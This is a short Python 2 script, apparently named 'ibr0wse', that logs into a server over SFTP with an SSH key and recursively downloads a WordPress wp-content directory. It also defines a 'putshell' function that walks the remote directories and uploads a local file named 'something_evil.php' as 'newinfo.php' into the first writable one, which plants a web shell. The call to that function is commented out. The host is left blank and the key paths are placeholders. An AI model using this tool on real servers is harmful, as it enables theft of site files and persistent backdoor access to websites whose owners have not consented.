#!/usr/bin/python
# ibr0wse
import paramiko,stat,os,sys,time,datetime

def createDir(name):
    cwd = os.getcwd()
    directory = cwd + "/%s" % (name)
    if not os.path.exists(directory):
        os.makedirs(directory)
        print "\n\t[*] Directory For %s Not Found" % (name)
        print "\n\t[!] Directory For %s Created..." % (name)
    else:
        print "\n\t[?] Directory For %s Already Exists" % (name)
    return directory


def getfile(sftp, path='.'):
    # loop over list of SFTPAttributes (files with modes)
    for attr in sftp.listdir_attr(path):
        cwd = os.getcwd()
        print "CURRENTLY IN %s" % (cwd)
        #if the attribute says there is a directory, go to it, else print filename
        if stat.S_ISDIR(attr.st_mode):
            direct = createDir(attr.filename)
            getfile(sftp, os.path.join(path,attr.filename))
            os.chdir(cwd)
        else:
            source = os.path.join(path,attr.filename)
            destination = cwd+"/"+attr.filename
            try:
                sftp.get(source, destination)
                print "[*] Downloaded to: %s" % (destination)
            except Exception as inst:
                print str(inst.args[1])+"! Could not download "+source+" to --> "+destination


def recursive(sftp, path='.'):
    # loop over list of SFTPAttributes (files with modes)
    for attr in sftp.listdir_attr(path):
        #if the attribute says there is a directory, go to it, else print filename
        if stat.S_ISDIR(attr.st_mode):
            print os.path.join(path,attr.filename)
            recursive(sftp, os.path.join(path,attr.filename))
        else:
            print "\t--"+attr.filename


def putshell(sftp, path='.'):
    # loop over list of SFTPAttributes (files with modes)
    source = "/home/username/local/path/to/something_evil.php"
    for attr in sftp.listdir_attr(path):
        #if the attribute says there is a directory, go to it, else print filename
        if stat.S_ISDIR(attr.st_mode):
            destination = os.path.join(path,attr.filename)+"/newinfo.php"
            try:
                sftp.put(source,destination)
                print "[!] Successfully uploaded file!"
                print "[*] Location: %s" % (destination)
                sys.exit()
            except Exception as inst:
                print str(inst.args[1])+"! Could not upload "+source+" to --> "+destination

            putshell(sftp, os.path.join(path,attr.filename))


paramiko.util.log_to_file('/tmp/paramiko.log')
host = ""
port = 22

mySSHK = "/home/bubbles/path/to/rsa"
mykey = paramiko.RSAKey.from_private_key_file(mySSHK)
transport = paramiko.Transport((host, port))
username = "YOURUSERNAME"
transport.connect(username = username, pkey = mykey)
sftp = paramiko.SFTPClient.from_transport(transport)

start_time = time.time()
path = "/opt/apps/wordpress/htdocs/wp-content/"

# recursive(sftp)
getfile(sftp,path)
# putshell(sftp,path)
end_time = time.time()
elapsed = end_time - start_time
print "[!] Completed in %s " % (str(datetime.timedelta(seconds=elapsed)))

sftp.close()
transport.close()
